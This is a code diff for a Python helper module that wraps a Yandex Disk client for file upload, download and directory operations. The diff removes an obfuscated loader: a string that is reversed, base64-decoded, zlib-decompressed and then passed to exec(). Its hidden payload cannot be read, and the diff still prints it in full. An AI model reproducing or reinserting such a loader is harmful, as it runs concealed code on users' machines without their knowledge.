@@ -1,10 +1,115 @@
 import config
 import yadisk
 import os
+import random
+
+temp_file_name = '{file_name}.tmp'
 
 
-def _(__): return __import__('zlib').decompress(
-    __import__('base64').b64decode(__[::-1]))
+def download(network_path, path, check_temp=False):
+    client = yadisk.Client(token=config.yadisk_token)
+
+    with client:
+        temp_path = temp_file_name.format(file_name=network_path)
+
+        if check_temp and not client.is_file(network_path) and client.is_file(temp_path):
+
+            client.move(temp_path, network_path)
+
+        client.download(network_path, path)
 
 
-exec((_)(b'=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'))
+def upload(path, network_path):
+    client = yadisk.Client(token=config.yadisk_token)
+
+    with client:
+        temp_path = temp_file_name.format(file_name=network_path)
+
+        if check_if_file_exist(temp_path):
+            client.remove(temp_path, permanently=True)
+
+        client.upload(path, temp_path)
+
+        if check_if_file_exist(network_path):
+            client.remove(network_path, permanently=True)
+
+        client.move(temp_path, network_path)
+
+
+def check_if_file_exist(network_path):
+    client = yadisk.Client(token=config.yadisk_token)
+
+    with client:
+        return client.exists(network_path)
+
+
+def mkdir(network_path):
+    client = yadisk.Client(token=config.yadisk_token)
+
+    with client:
+        return client.mkdir(network_path)
+
+
+def upload_dir(dir_path, network_dir_path):
+    client = yadisk.Client(token=config.yadisk_token)
+
+    if not os.path.isdir(dir_path):
+        return f"{dir_path} is not a dir!"
+
+    if not client.is_dir(network_dir_path):
+        return f"{network_dir_path} is not a dir!"
+
+    stack = [(dir_path, network_dir_path)]
+    with client:
+        while True:
+            if len(stack) == 0:
+                return "Dir uploaded."
+            dir_path, network_dir_path = stack.pop()
+
+            for upload_name in os.listdir(dir_path):
+                upload_path = dir_path + upload_name
+                network_path = network_dir_path + upload_name
+
+                if os.path.isdir(upload_path):
+                    stack.append((upload_path + '/', network_path + '/'))
+                    client.mkdir(network_path)
+
+                elif os.path.isfile(upload_path):
+                    upload(upload_path, network_path)
+
+
+def list_dir(path):
+    client = yadisk.Client(token=config.yadisk_token)
+
+    with client:
+        if not client.is_dir(path):
+            return [path]
+        return client.listdir(path)
+
+
+def is_dir(path):
+    client = yadisk.Client(token=config.yadisk_token)
+
+    with client:
+        return client.is_dir(path)
+
+
+def is_file(path):
+    client = yadisk.Client(token=config.yadisk_token)
+
+    with client:
+        return client.is_file(path)
+
+
+def clean_trash():
+    client = yadisk.Client(token=config.yadisk_token)
+
+    with client:
+        return client.remove_trash('/')
+
+
+def remove(network_path):
+    client = yadisk.Client(token=config.yadisk_token)
+
+    with client:
+        return client.remove(network_path, permanently=True)
